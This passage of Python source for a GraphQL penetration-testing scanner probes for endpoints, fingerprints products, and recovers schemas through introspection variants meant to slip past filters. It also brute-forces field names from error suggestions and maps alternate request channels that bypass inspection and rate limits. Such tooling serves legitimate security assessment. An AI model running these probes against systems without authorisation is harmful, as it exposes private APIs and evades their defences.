            params[self.url_doc_key] = (url_doc if url_doc is not None
                                        else doc)
            if variables:
                params["variables"] = json.dumps(variables)
            if op_name:
                params["operationName"] = op_name
        if self.doc_in in ("body", "both"):
            if self.body_kind == "json":
                payload = {}
                if op_name:
                    payload["operationName"] = op_name
                if variables:
                    payload["variables"] = variables
                payload[self.body_doc_key] = doc
                body = json.dumps(payload)
                ctype = "application/json"
            elif self.body_kind == "form":
                d = {self.body_doc_key: doc}
                if variables:
                    d["variables"] = json.dumps(variables)
                if op_name:
                    d["operationName"] = op_name
                body = urllib.parse.urlencode(d)
                ctype = "application/x-www-form-urlencoded"
            else:
                body = doc
                ctype = "application/graphql"
        full = url
        if params:
            sep = "&" if "?" in full else "?"
            full = full + sep + urllib.parse.urlencode(params)
        return self.method, full, body, ctype


# Probed in order until one answers. The first is the standard one.
TRANSPORT_LADDER = [
    Transport(),
    Transport(label="GET ?query=", method="GET", doc_in="url",
              url_doc_key="query"),
    Transport(label="POST application/json {doc}", body_doc_key="doc"),
    Transport(label="GET ?doc=", method="GET", doc_in="url",
              url_doc_key="doc"),
    Transport(label="POST ?doc= (document in the URL, no body)",
              method="POST", doc_in="url", url_doc_key="doc"),
    Transport(label="POST form-urlencoded query=", body_kind="form"),
    Transport(label="POST application/graphql", body_kind="graphql"),
]


# ----------------------------------------------------------------------------
# GraphQL client
# ----------------------------------------------------------------------------

ANON = Identity(name="anon")


class GraphQL:
    def __init__(self, http: Http, url: str, rep: Reporter, budget: Budget,
                 transport: Transport = None):
        self.http = http
        self.url = url
        self.rep = rep
        self.budget = budget
        self.transport = transport or Transport()

    def _send(self, method, body, ctype, identity: Identity, url=None,
              max_read=MAX_BODY):
        self.budget.spend()
        headers = dict(identity.headers)
        if ctype:
            headers["Content-Type"] = ctype
        r = self.http.request(method, url or self.url, body, headers,
                              max_read=max_read)
        if not r.ok:
            self.budget.ok_error()
            self.rep.debug(f"{method} {url or self.url} -> {r.error}")
            return r
        if r.status == 429:
            wait = 2.0
            try:
                wait = min(20.0, float(r.header("Retry-After") or 2))
            except ValueError:
                pass
            self.rep.debug(f"429 from {self.url}, backing off {wait}s")
            time.sleep(wait)
            self.budget.ok_error()
            return r
        self.budget.good()
        self.rep.debug(f"{method} {url or self.url} [{ctype}] "
                       f"{(body or '')[:160]!r} -> {r.status} {len(r.body)}b "
                       f"{r.elapsed*1000:.0f}ms")
        return r

    def post(self, query, variables=None, identity=ANON, op_name=None,
             url=None, max_read=MAX_BODY, transport=None, url_doc=None):
        """
        The normal way to send a document: through the active transport, which
        was either learned from -r or probed. Named `post` for history; it is
        not necessarily a POST any more.
        """
        t = transport or self.transport
        method, full, body, ctype = t.build(url or self.url, query, variables,
                                            op_name, url_doc=url_doc)
        return self._send(method, body, ctype, identity, full, max_read)

    def post_raw_json(self, payload_obj, identity=ANON, url=None):
        return self._send("POST", json.dumps(payload_obj), "application/json",
                          identity, url)

    def post_graphql_ct(self, query, identity=ANON, url=None):
        return self._send("POST", query, "application/graphql", identity, url)

    def post_form(self, query, identity=ANON, url=None):
        body = urllib.parse.urlencode({"query": query})
        return self._send("POST", body,
                          "application/x-www-form-urlencoded", identity, url)

    def get(self, query, identity=ANON, url=None, variables=None):
        params = {"query": query}
        if variables:
            params["variables"] = json.dumps(variables)
        base = url or self.url
        sep = "&" if "?" in base else "?"
        full = base + sep + urllib.parse.urlencode(params)
        return self._send("GET", None, None, identity, full)


def gql_errors(resp: Response):
    obj = resp.json()
    if isinstance(obj, dict) and isinstance(obj.get("errors"), list):
        return [str(e.get("message", "")) for e in obj["errors"]
                if isinstance(e, dict)]
    return []


def gql_data(resp: Response):
    obj = resp.json()
    if isinstance(obj, dict) and obj.get("data") is not None:
        return obj["data"]
    return None


GRAPH_API_ERR_RX = re.compile(
    r"(?i)(access token|oauth|graphql|unsupported (get|post) request|"
    r"must provide|query string|doc_id|malformed)")


def graph_api_error(resp: Response):
    """
    Meta's Graph API answers {"error":{"message":..,"type":..,"code":..}} -
    a singular object, not the spec's `errors` array. An endpoint answering
    that shape is not 'not GraphQL', it is GraphQL asking for a token.
    """
    obj = resp.json()
    if not isinstance(obj, dict):
        return ""
    err = obj.get("error")
    if not isinstance(err, dict):
        return ""
    msg = str(err.get("message", ""))
    if not msg:
        return ""
    if GRAPH_API_ERR_RX.search(msg) or err.get("type") or err.get("code"):
        return f"{err.get('type', 'error')} {err.get('code', '')}: {msg}"[:200]
    return ""


HEADER_SIGNATURES = [
    ("Meta Graph API (GraphQL over the Graph gateway)",
     ("x-fb-rev", "x-fb-request-id", "x-fb-trace-id", "x-app-usage",
      "x-fb-debug")),
    ("Shopify", ("x-shopify-stage", "x-shopify-api-version",
                 "x-shopid", "x-sorting-hat-shopid")),
    ("Hasura", ("x-hasura-role", "x-hasura-user-id")),
    ("Cloudflare in front", ("cf-ray", "cf-cache-status")),
    ("Apollo Router / Gateway", ("apollographql-client-name",
                                 "x-apollo-operation-name")),
]


def fingerprint_headers(headers):
    got = {k.lower() for k in (headers or {})}
    out = []
    for product, markers in HEADER_SIGNATURES:
        hits = [m for m in markers if m in got]
        if len(hits) >= 2 or (len(hits) == 1 and len(markers) <= 2):
            out.append((product, hits))
    return out


def looks_graphql(resp: Response):
    """A GraphQL response, and nothing else, has one of these two shapes."""
    obj = resp.json()
    if not isinstance(obj, dict):
        return False
    if "data" in obj:
        return True
    errs = obj.get("errors")
    if isinstance(errs, list) and errs and all(isinstance(e, dict)
                                               for e in errs):
        return True
    return bool(graph_api_error(resp))


# ----------------------------------------------------------------------------
# Schema model
# ----------------------------------------------------------------------------

def type_ref(t):
    """{'kind':'NON_NULL','ofType':{'kind':'LIST',...}} -> '[User!]!'"""
    if not isinstance(t, dict):
        return "?"
    kind = t.get("kind")
    if kind == "NON_NULL":
        return type_ref(t.get("ofType")) + "!"
    if kind == "LIST":
        return "[" + type_ref(t.get("ofType")) + "]"
    return t.get("name") or "?"


def base_type_name(t):
    while isinstance(t, dict) and t.get("ofType"):
        t = t["ofType"]
    return (t or {}).get("name") if isinstance(t, dict) else None


class Schema:
    def __init__(self, introspection):
        s = introspection["__schema"] if "__schema" in introspection \
            else introspection
        self.raw = s
        self.query_type = (s.get("queryType") or {}).get("name")
        self.mutation_type = (s.get("mutationType") or {}).get("name")
        self.subscription_type = (s.get("subscriptionType") or {}).get("name")
        self.types = {}
        for t in s.get("types") or []:
            if isinstance(t, dict) and t.get("name"):
                self.types[t["name"]] = t

    # -- accessors ----------------------------------------------------------

    def fields_of(self, type_name):
        t = self.types.get(type_name) or {}
        return [f for f in (t.get("fields") or []) if isinstance(f, dict)]

    def root_queries(self):
        return self.fields_of(self.query_type) if self.query_type else []

    def root_mutations(self):
        return self.fields_of(self.mutation_type) if self.mutation_type else []

    def is_leaf(self, type_name):
        t = self.types.get(type_name)
        return not t or t.get("kind") in ("SCALAR", "ENUM")

    def required_args(self, f):
        return [a for a in (f.get("args") or [])
                if isinstance(a, dict)
                and (a.get("type") or {}).get("kind") == "NON_NULL"
                and a.get("defaultValue") in (None, "null")]

    # -- SDL ----------------------------------------------------------------

    def sdl(self):
        out = []
        if self.query_type or self.mutation_type:
            out.append("schema {")
            if self.query_type:
                out.append(f"  query: {self.query_type}")
            if self.mutation_type:
                out.append(f"  mutation: {self.mutation_type}")
            if self.subscription_type:
                out.append(f"  subscription: {self.subscription_type}")
            out.append("}\n")
        for name in sorted(self.types):
            if name.startswith("__"):
                continue
            t = self.types[name]
            kind = t.get("kind")
            if kind == "SCALAR":
                if name not in ("String", "Int", "Float", "Boolean", "ID"):
                    out.append(f"scalar {name}\n")
                continue
            if kind == "ENUM":
                vals = [v.get("name") for v in (t.get("enumValues") or [])
                        if isinstance(v, dict)]
                out.append(f"enum {name} {{")
                out += [f"  {v}" for v in vals]
                out.append("}\n")
                continue
            if kind == "UNION":
                pt = " | ".join(p.get("name", "?")
                                for p in (t.get("possibleTypes") or [])
                                if isinstance(p, dict))
                out.append(f"union {name} = {pt}\n")
                continue
            if kind in ("OBJECT", "INTERFACE"):
                kw = "type" if kind == "OBJECT" else "interface"
                ifaces = [i.get("name") for i in (t.get("interfaces") or [])
                          if isinstance(i, dict) and i.get("name")]
                head = f"{kw} {name}"
                if ifaces:
                    head += " implements " + " & ".join(ifaces)
                out.append(head + " {")
                for f in t.get("fields") or []:
                    if not isinstance(f, dict):
                        continue
                    args = f.get("args") or []
                    astr = ""
                    if args:
                        astr = "(" + ", ".join(
                            f"{a.get('name')}: {type_ref(a.get('type'))}"
                            + (f" = {a['defaultValue']}"
                               if a.get("defaultValue") not in (None,) else "")
                            for a in args if isinstance(a, dict)) + ")"
                    dep = "   # @deprecated" if f.get("isDeprecated") else ""
                    out.append(f"  {f.get('name')}{astr}: "
                               f"{type_ref(f.get('type'))}{dep}")
                out.append("}\n")
                continue
            if kind == "INPUT_OBJECT":
                out.append(f"input {name} {{")
                for a in t.get("inputFields") or []:
                    if isinstance(a, dict):
                        out.append(f"  {a.get('name')}: "
                                   f"{type_ref(a.get('type'))}")
                out.append("}\n")
        return "\n".join(out)

    def stats(self):
        objs = sum(1 for n, t in self.types.items()
                   if not n.startswith("__") and t.get("kind") == "OBJECT")
        return (len([n for n in self.types if not n.startswith("__")]), objs,
                len(self.root_queries()), len(self.root_mutations()))


# ----------------------------------------------------------------------------
# Introspection documents
# ----------------------------------------------------------------------------

INTROSPECTION_FULL = """
query %(op)s {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
  }
}
fragment FullType on __Type {
  kind
  name
  fields(includeDeprecated: true) {
    name
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name }
  possibleTypes { ...TypeRef }
}
fragment InputValue on __InputValue {
  name
  type { ...TypeRef }
  defaultValue
}
fragment TypeRef on __Type {
  kind name
  ofType { kind name
    ofType { kind name
      ofType { kind name
        ofType { kind name
          ofType { kind name
            ofType { kind name } } } } } }
}
"""

INTROSPECTION_MIN = (
    "{__schema{queryType{name}mutationType{name}subscriptionType{name}"
    "types{kind name fields{name args{name type{kind name ofType{kind name "
    "ofType{kind name}}}}type{kind name ofType{kind name ofType{kind name "
    "ofType{kind name}}}}}inputFields{name type{kind name ofType{kind name}}}"
    "enumValues{name}possibleTypes{kind name}interfaces{kind name}}}}")

TYPE_PROBE = ("{%s}")
TYPE_PROBE_ONE = ('a%d: __type(name: "%s") { kind name '
                  'fields { name type { kind name ofType { kind name '
                  'ofType { kind name } } } '
                  'args { name type { kind name ofType { kind name } } } } '
                  'inputFields { name type { kind name ofType { kind name } } } '
                  'enumValues { name } }')



SCHEMA_SIGNATURES = [
    ("Drupal (graphql module)",
     ("TaxonomyTerm", "nodeRevisionById", "paragraph", "menuLinkContent",
      "EntityQueryResult", "FieldUserPass")),
    ("Drupal + simple_oauth (Consumers)",
     ("Consumer", "Oauth2Token", "Oauth2TokenAccessToken")),
    ("WordPress (WPGraphQL)",
     ("RootQueryToPostConnection", "MediaItem", "PostFormat", "WPPageInfo")),
    ("Saleor", ("Checkout", "ProductVariant", "TranslatableItem",
                "AppExtension")),
    ("Shopify", ("ShopifyPaymentsAccount", "MoneyV2", "MetafieldConnection")),
    ("Strapi", ("UploadFile", "UsersPermissionsUser", "ComponentShared")),
    ("Directus", ("directus_users", "directus_files", "directus_roles")),
    ("Magento", ("CartItemInterface", "CustomerToken", "ProductInterface")),
    ("Gatsby", ("SitePage", "SiteFunction", "ImageSharp")),
    ("Hasura", ("query_root", "mutation_root")),
    ("Contentful", ("ContentfulMetadata", "AssetCollection", "EntryCollection")),
]


def fingerprint_schema(schema):
    """The type names give the product away where error strings do not."""
    names = set(schema.types)
    flat = " ".join(names)
    hits = []
    for product, markers in SCHEMA_SIGNATURES:
        score = sum(1 for m in markers if m in names or m in flat)
        if score >= 2:
            hits.append((score, product, [m for m in markers
                                          if m in names or m in flat]))
    hits.sort(reverse=True)
    return hits


# ----------------------------------------------------------------------------
# The hunter
# ----------------------------------------------------------------------------

class GqlHunter:
    def __init__(self, http, rep, args, out_root, status=None):
        self.http = http
        self.rep = rep
        self.args = args
        self.out_root = out_root
        self.status = status
        self.findings = []
        self.field_types = {}
        self.seen_ids = []
        self.pocs = []
        self.learned_transport = getattr(args, "_transport", None)
        self.active_transport = None
        self.transport_ok = []
        self.seed_words = []
        self.seed_near_misses = []
        self.extra_paths = []
        if getattr(args, "paths", None):
            try:
                with open(args.paths, encoding="utf-8",
                          errors="replace") as fh:
                    for line in fh:
                        line = line.strip()
                        if not line or line.startswith("#"):
                            continue
                        if "://" in line:
                            line = urllib.parse.urlsplit(line).path or "/"
                        if not line.startswith("/"):
                            line = "/" + line
                        if line not in ENDPOINT_PATHS:
                            self.extra_paths.append(line)
                rep.info(f"{len(self.extra_paths)} extra path(s) from "
                         f"{args.paths}")
            except Exception as e:
                rep.warn(f"cannot read {args.paths}: {e}")
        self.lock = threading.Lock()

    # -- reporting ----------------------------------------------------------

    def add(self, f: Finding):
        with self.lock:
            self.findings.append(f)
        self.rep.finding(f)
        if self.status:
            self.status.record()


    def open_log(self, target_url, identities):
        """
        The directory and the log exist from the first request, so a target
        with nothing to report still leaves a trace of what was attempted.
        """
        if not self.out_root:
            return
        d = self.outdir(target_url)
        if not d:
            return
        path = os.path.join(d, "output.log")
        try:
            fh = open(path, "a", encoding="utf-8")
        except Exception as e:
            self.rep.warn(f"cannot open {path}: {e}")
            return
        self.rep.attach(fh)
        stamp = time.strftime("%Y-%m-%d %H:%M:%S")
        ids = ", ".join(i.name for i in identities)
        self.rep.log_only(
            f"\n{'=' * 72}\n"
            f"gqlhunt {VERSION}  {stamp}\n"
            f"target      : {target_url}\n"
            f"identities  : {ids}\n"
            f"budget      : {self.args.max_requests} requests / "
            f"{self.args.max_time:.0f}s\n"
            f"command     : {' '.join(sys.argv)}\n"
            f"{'=' * 72}")

    def outdir(self, url):
        p = urllib.parse.urlsplit(url)
        slug = re.sub(r"[^A-Za-z0-9.\-_]", "_",
                      f"{p.hostname or 'target'}_{p.port or ''}").strip("_")
        d = os.path.join(self.out_root, slug)
        try:
            os.makedirs(d, exist_ok=True)
        except Exception as e:
            self.rep.warn(f"cannot create {d}: {e}")
            return None
        return d

    def write(self, url, filename, text):
        if not self.out_root:
            return None
        d = self.outdir(url)
        if not d:
            return None
        path = os.path.join(d, filename)
        try:
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(text if text.endswith("\n") else text + "\n")
            self.rep.info(f"wrote {path}")
            return path
        except Exception as e:
            self.rep.warn(f"cannot write {path}: {e}")
            return None

    # -- 1. discovery -------------------------------------------------------

    def discover(self, base_url, identity, budget) -> str:
        """Return the confirmed GraphQL endpoint URL, or ''."""
        p = urllib.parse.urlsplit(base_url if "://" in base_url
                                  else "https://" + base_url)
        origin = f"{p.scheme}://{p.netloc}"
        candidates = []
        if p.path and p.path not in ("/", ""):
            candidates.append(f"{origin}{p.path}"
                              + (f"?{p.query}" if p.query else ""))
        candidates += [origin + path
                       for path in ENDPOINT_PATHS + self.extra_paths]
        seen = set()

        gql = GraphQL(self.http, "", self.rep, budget)
        self.guarded = []
        for url in candidates:
            if url in seen:
                continue
            seen.add(url)
            self.rep.test(f"probing {url}")
            r = gql.post("{__typename}", identity=identity, url=url,
                         max_read=64 * 1024)
            if not r.ok:
                continue
            data = gql_data(r)
            if isinstance(data, dict) and "__typename" in data:
                self.rep.info(f"{url}: GraphQL confirmed "
                              f"(Query type '{data['__typename']}')")
                return url
            if looks_graphql(r) and r.status in (200, 400, 405, 500):
                errs = " ".join(gql_errors(r)).lower()
                if any(k in errs for k in ("query", "graphql", "syntax",
                                           "must provide", "operation")):
                    self.rep.info(f"{url}: GraphQL confirmed (error shape)")
                    return url
            if r.status in (401, 403, 405, 429) and url in candidates[:2] + [
                    origin + p2 for p2 in ENDPOINT_PATHS[:14]]:
                self.guarded.append((url, r.status,
                                     re.sub(r"\s+", " ",
                                            (r.body or ""))[:90]))
        return ""


    WAF_RX = re.compile(r"(?i)(forbidden|access denied|blocked|cloudflare|"
                        r"akamai|incapsula|imperva|request rejected|"
                        r"not authorized|unauthorized|authentication required|"
                        r"attention required)")

    def report_guarded(self, target_url):
        """
        A 401/403 on /graphql is not 'nothing there'. It is an endpoint you
        cannot reach anonymously - which is exactly what -r is for.
        """
        rows = getattr(self, "guarded", [])
        if not rows:
            return False
        waf = any(self.WAF_RX.search(b or "") for _, _, b in rows)
        self.add(Finding(
            sev=INFO,
            title="GraphQL endpoint present but guarded",
            url=rows[0][0],
            impact="The path answers with an authentication or policy "
                   "refusal rather than a 404, so something is mounted "
                   "there. Nothing below could be tested anonymously.",
            proof=[f"{u} -> HTTP {st}   {b}" for u, st, b in rows[:8]],
            note=("the refusal looks like a WAF or edge policy, not the "
                  "application" if waf else "") +
                 "  re-run with -r and a captured authenticated request",
            poc=f"gqlhunt.py -u {target_url} -r burp-authenticated.txt"))
        return True

    def check_persisted(self, gql, identity, url):
        """APQ-only servers refuse free-form documents - say so explicitly."""
        r = gql.post("{__typename}", identity=identity)
        msgs = " ".join(gql_errors(r))
        if re.search(r"(?i)persisted ?quer(y|ies)|PERSISTED_QUERY_NOT_FOUND|"
                     r"only (allows|accepts) persisted|query ?id required",
                     msgs):
            self.add(Finding(
                sev=INFO,
                title="Persisted queries only (APQ)",
                url=url,
                impact="Free-form documents are refused, so introspection "
                       "and brute force cannot work. The operations are in "
                       "the front-end bundle instead - that is where the "
                       "schema is.",
                proof=[msgs[:180]],
                note="extract the query documents and their sha256 hashes "
                     "from the app's JavaScript, then replay them here"))
            return True
        return False

    # -- 2. fingerprint -----------------------------------------------------

    def fingerprint(self, gql, identity):
        bodies = {}
        for key, doc in FP_PROBES.items():
            try:
                if key == "empty":
                    r = gql._send("POST", "{}", "application/json", identity)
                else:
                    r = gql.post(doc, identity=identity, max_read=32 * 1024)
            except Budget.Exhausted:
                break
            bodies[key] = (r.body or "") + " " + " ".join(
                f"{k}: {v}" for k, v in (r.headers or {}).items())

        scores = {}
        evidence = {}
        for engine, probe, rx, weight in FP_SIGNATURES:
            body = bodies.get(probe, "")
            if body and re.search(rx, body):
                scores[engine] = scores.get(engine, 0) + weight
                evidence.setdefault(engine, []).append(f"{probe}: /{rx}/")
        if not scores:
            return "unknown", 0, bodies
        best = max(scores.items(), key=lambda kv: kv[1])
        return best[0], best[1], bodies

    # -- 3. schema acquisition ladder ---------------------------------------

    def acquire_schema(self, gql, identity, budget):
        """Cheapest rung first. Returns (Schema|None, how, partial_types)."""
        op = "IntrospectionQuery"
        full = INTROSPECTION_FULL % {"op": op}

        def try_resp(r, how):
            if not r.ok:
                return None
            data = gql_data(r)
            if isinstance(data, dict) and isinstance(data.get("__schema"), dict):
                types = data["__schema"].get("types") or []
                if types:
                    self.rep.info(f"schema acquired: {how} "
                                  f"({len(types)} types)")
                    return Schema(data)
            return None

        rungs = [
            ("introspection (POST)",
             lambda: gql.post(full, identity=identity, op_name=op)),
            ("introspection (POST, minimal document)",
             lambda: gql.post(INTROSPECTION_MIN, identity=identity)),
            ("introspection (GET)",
             lambda: gql.get(INTROSPECTION_MIN, identity=identity)),
            ("introspection (newline-split, defeats naive filters)",
             lambda: gql.post(INTROSPECTION_MIN.replace("{__schema",
                                                        "{\n__schema\n"),
                              identity=identity)),
            ("introspection (application/graphql)",
             lambda: gql.post_graphql_ct(INTROSPECTION_MIN, identity=identity)),
            ("introspection (array batch envelope)",
             lambda: gql.post_raw_json([{"query": INTROSPECTION_MIN}],
                                       identity=identity)),
            ("introspection (form-urlencoded)",
             lambda: gql.post_form(INTROSPECTION_MIN, identity=identity)),
        ]

        for how, fn in rungs:
            try:
                r = fn()
            except Budget.Exhausted:
                raise
            if not r.ok:
                continue
            # the batch envelope answers with a list
            obj = r.json()
            if isinstance(obj, list) and obj:
                inner = obj[0]
                if isinstance(inner, dict) and isinstance(inner.get("data"),
                                                          dict):
                    d = inner["data"]
                    if isinstance(d.get("__schema"), dict) and \
                            d["__schema"].get("types"):
                        self.rep.info(f"schema acquired: {how}")
                        return Schema(d), how, {}
            sch = try_resp(r, how)
            if sch:
                return sch, how, {}
            errs = gql_errors(r)
            if errs:
                self.rep.debug(f"{how} refused: {errs[0][:120]}")

        # rung 8: __type() probing, batched
        types = self.probe_types(gql, identity, budget)
        if types:
            fake = {"queryType": {"name": "Query"},
                    "mutationType": {"name": "Mutation"},
                    "subscriptionType": None,
                    "types": list(types.values())}
            return Schema({"__schema": fake}), \
                "__type() probing (__schema was blocked)", types
        return None, "", {}

    def probe_types(self, gql, identity, budget):
        """__schema blocked but __type often is not. Batched, so it is cheap."""
        words = list(dict.fromkeys(TYPE_WORDS))
        found = {}
        size = max(1, self.args.batch_size // 4)
        for i in range(0, len(words), size):
            chunk = words[i:i + size]
            doc = TYPE_PROBE % " ".join(
                TYPE_PROBE_ONE % (n, name) for n, name in enumerate(chunk))
            try:
                r = gql.post(doc, identity=identity)
            except Budget.Exhausted:
                break
            data = gql_data(r)
            if not isinstance(data, dict):
                if i == 0:
                    return {}       # __type is blocked too, do not waste more
                continue
            for key, val in data.items():
                if isinstance(val, dict) and val.get("name"):
                    found[val["name"]] = val
            if budget.left() < 20:
                break
        if found:
            self.rep.info(f"__type() probing recovered {len(found)} type(s)")
        return found

    # -- suggestions --------------------------------------------------------

    SUGGEST_RX = re.compile(r"Did you mean ([^?]+)\?")
    ON_TYPE_RX = re.compile(r"on type [\"'`]([A-Za-z_][A-Za-z0-9_]*)[\"'`]")
    NEEDS_SEL_RX = re.compile(
        r"[\"'`](\w+)[\"'`] of type [\"'`](\[?[A-Za-z_][A-Za-z0-9_!\[\]]*)"
        r"[\"'`] must have a selection")
    QUOTED_RX = re.compile(r"[\"'`]([A-Za-z_][A-Za-z0-9_]*)[\"'`]")

    # Deliberate near-misses of field names almost every API has. Meta-fields
    # (__typename) are NOT usable here: engines exclude them from the
    # suggestion list, and a filter that blocks introspection usually blocks
    # any document containing "__type" at all.
    NEAR_MISSES = ["usr", "usrs", "userr", "acount", "accnt", "mee", "viewr",
                   "custmer", "clint", "membr", "profil", "ordr", "ordrs",
                   "invioce", "paiment", "transation", "prodct", "itm",
                   "artcle", "pots", "postz", "commnt", "fil", "documnt",
                   "seting", "confg", "tokn", "sesion", "serch", "nod",
                   "teem", "projct", "tiket", "adress", "categry", "revew",
                   "bookng", "tsk", "evnt", "reprot", "compny", "grup",
                   "notifcation", "mesage", "subscribtion", "feild"]

    def suggestions_enabled(self, gql, identity):
        """
        One batched request decides it, and nothing is wasted: the suggestions
        it harvests are real field names we keep.

        A negative here is not proof that the engine has suggestions off - it
        may simply have no field close to any of these - but it is exactly the
        signal needed to decide whether brute forcing is worth a single
        further request.
        """
        probes = list(dict.fromkeys(
            getattr(self, "seed_near_misses", []) + self.NEAR_MISSES))[:60]
        doc = "{ " + " ".join(f"s{i}: {w}"
                              for i, w in enumerate(probes)) + " }" 
        try:
            r = gql.post(doc, identity=identity)
        except Budget.Exhausted:
            return False
        msgs = gql_errors(r)
        found = self.harvest_suggestions(msgs)
        if found:
            self._free_names = sorted(found)
            self.rep.info(f"suggestions are ON: {len(found)} field name(s) "
                          f"leaked by a single request")
            return True
        return False

    def harvest_suggestions(self, messages):
        out = set()
        for m in messages:
            for hit in self.SUGGEST_RX.finditer(m):
                for name in self.QUOTED_RX.findall(hit.group(1)):
                    out.add(name)
        return out

    def brute_force_roots(self, gql, identity, budget, words):
        """
        N candidates per request, not one. Every invalid alias produces its own
        error entry, and each error carries its own suggestions - so a batch of
        64 aliases is 64 tests and up to 320 suggested names for one request.
        """
        known, suggested = set(), set(getattr(self, "_free_names", []))
        size = max(4, self.args.batch_size)
        total = 0
        for i in range(0, len(words), size):
            chunk = words[i:i + size]
            doc = "{ " + " ".join(f"a{n}: {w}" for n, w in enumerate(chunk)
                                  if re.match(r"^[A-Za-z_][A-Za-z0-9_]*$", w)) \
                  + " }"
            try:
                r = gql.post(doc, identity=identity)
            except Budget.Exhausted:
                break
            msgs = gql_errors(r)
            total += 1
            suggested |= self.harvest_suggestions(msgs)
            # "must have a selection of subfields" means the field EXISTS
            for m in msgs:
                sel = self.NEEDS_SEL_RX.search(m)
                if sel:
                    fname, ftype = sel.group(1), sel.group(2)
                    if fname in chunk:
                        known.add(fname)
                        self.field_types[fname] = ftype.strip("[]!")
                    continue
                if "must not have a selection" in m:
                    for name in self.QUOTED_RX.findall(m):
                        if name in chunk:
                            known.add(name)
            data = gql_data(r)
            if isinstance(data, dict):
                for alias, _ in data.items():
                    idx = int(alias[1:]) if alias[1:].isdigit() else -1
                    if 0 <= idx < len(chunk):
                        known.add(chunk[idx])
            if total == 1 and not known and not suggested:
                self.rep.info("brute force abandoned after one batch: the "
                              "engine returns neither suggestions nor "
                              "field-shape errors")
                break
            if budget.left() < 15:
                self.rep.info("brute force stopped: request budget nearly out")
                break
        self.rep.info(f"suggestion brute force: {total} request(s) for "
                      f"{len(words)} candidates -> {len(known)} confirmed, "
                      f"{len(suggested)} suggested")
        return known, suggested



    def resolve_field_types(self, gql, identity, names):
        """One batch: ask for each name bare, and read the type out of the
        'must have a selection of subfields' error it provokes."""
        doc = "{ " + " ".join(f"t{i}: {n}" for i, n in enumerate(names)
                              if re.match(r"^[A-Za-z_][A-Za-z0-9_]*$", n)) + " }"
        try:
            r = gql.post(doc, identity=identity)
        except Budget.Exhausted:
            return
        for m in gql_errors(r):
            sel = self.NEEDS_SEL_RX.search(m)
            if sel and sel.group(1) in names:
                self.field_types[sel.group(1)] = sel.group(2).strip("[]!")

    def brute_force_subfields(self, gql, identity, budget, parents, words):
        """
        Depth 2, and it is what makes the recovered names usable: the errors
        inside a selection set are validated against the CHILD type, and they
        name it - `Cannot query field 'emai' on type 'User'`.
        """
        out = {}
        size = max(4, self.args.batch_size)
        for parent in parents:
            if budget.left() < 30:
                break
            names, tname = set(), self.field_types.get(parent, "")
            for i in range(0, len(words), size):
                chunk = [w for w in words[i:i + size]
                         if re.match(r"^[A-Za-z_][A-Za-z0-9_]*$", w)]
                doc = "{ %s { %s } }" % (
                    parent, " ".join(f"b{n}: {w}"
                                     for n, w in enumerate(chunk)))
                try:
                    r = gql.post(doc, identity=identity)
                except Budget.Exhausted:
                    return out
                msgs = gql_errors(r)
                for m in msgs:
                    hit = self.ON_TYPE_RX.search(m)
                    if hit and hit.group(1) not in ("Query", "Mutation"):
                        tname = tname or hit.group(1)
                names |= self.harvest_suggestions(msgs)
                for m in msgs:
                    sel = self.NEEDS_SEL_RX.search(m)
                    if sel and sel.group(1) in chunk:
                        names.add(sel.group(1))
                if i == 0 and not names:
                    break
            if names:
                out[parent] = (tname or "?", sorted(names))
                self.rep.info(f"{parent} ({tname or '?'}): "
                              f"{len(names)} field(s) recovered")
        return out


    # -- transport resolution -----------------------------------------------

    def resolve_transport(self, gql, identity, budget, learned=None):
        """
        Find the wire format this endpoint actually speaks. A transport
        learned from -r is tried first and, when it works, nothing else is
        probed - the capture is ground truth.
        """
        probe = "{__typename}"
        self.transport_ok = []
        tried, best, best_score = [], None, -1
        candidates = ([learned] if learned else []) + list(TRANSPORT_LADDER)
        for t in candidates:
            if t.describe() in tried:
                continue
            tried.append(t.describe())
            try:
                r = gql.post(probe, identity=identity, transport=t,
                             max_read=64 * 1024)
            except Budget.Exhausted:
                break
            data = gql_data(r)
            if isinstance(data, dict) and "__typename" in data:
                self.transport_ok.append(t)
                self.rep.info(f"transport: {t.label} -> "
                              f"Query type '{data['__typename']}'")
                if t is candidates[0] or len(self.transport_ok) == 1:
                    # keep probing the rest only to map the surface, cheaply
                    for other in TRANSPORT_LADDER:
                        if other.describe() in tried:
                            continue
                        tried.append(other.describe())
                        try:
                            rr = gql.post(probe, identity=identity,
                                          transport=other,
                                          max_read=32 * 1024)
                        except Budget.Exhausted:
                            break
                        dd = gql_data(rr)
                        if isinstance(dd, dict) and dd.get("__typename"):
                            self.transport_ok.append(other)
                return t, True
            score = 0
            errs = " ".join(gql_errors(r))
            if errs:
                score = 2
                if re.search(r"(?i)(cannot query|syntax|validation|operation)",
                             errs):
                    score = 3
            elif graph_api_error(r):
                score = 1
            if score > best_score:
                best, best_score = t, score
        chosen = best or learned or TRANSPORT_LADDER[0]
        self.rep.info(f"transport: none returned data; using {chosen.label}")
        return chosen, False

    def accepted_locations(self, gql, identity):
        """Every place this endpoint will take a document from."""
        cached = getattr(self, "transport_ok", None)
        if cached:
            seen, out = set(), []
            for t in cached:                      # Transport is not hashable
                if t.describe() not in seen:
                    seen.add(t.describe())
                    out.append(t)
            return out
        ok = []
        for t in TRANSPORT_LADDER:
            try:
                r = gql.post("{__typename}", identity=identity, transport=t,
                             max_read=32 * 1024)
            except Budget.Exhausted:
                break
            data = gql_data(r)
            if isinstance(data, dict) and data.get("__typename"):
                ok.append(t)
        return ok

    def test_transport_surface(self, gql, identity, url, schema):
        """
        Two findings nobody tests for.

        1. How many different places accept a document. A filter, a WAF rule
           or a quota counter that inspects one parameter is bypassed by
           sending the document through another.
        2. When the document travels in the URL *and* in the body at the same
           time - the shape Meta's Graph gateway uses - which copy actually
           executes. Put a benign document in each and read the answer: the
           one that comes back is the one the engine used, and the other is
           what any inspection layer is reading.
        """
        ok = self.accepted_locations(gql, identity)
        if len(ok) > 1:
            self.add(Finding(
                sev=LOW,
                title=f"The document is accepted through {len(ok)} different "
                      f"channels",
                url=url,
                impact="Rate limiting, logging and request-inspection rules "
                       "are usually written for one of them. The others are "
                       "the same engine reached by another door.",
                proof=[t.describe() for t in ok],
                note="useful as a bypass primitive, not as a finding on its "
                     "own"))

        has_url = any(t.doc_in == "url" for t in ok)
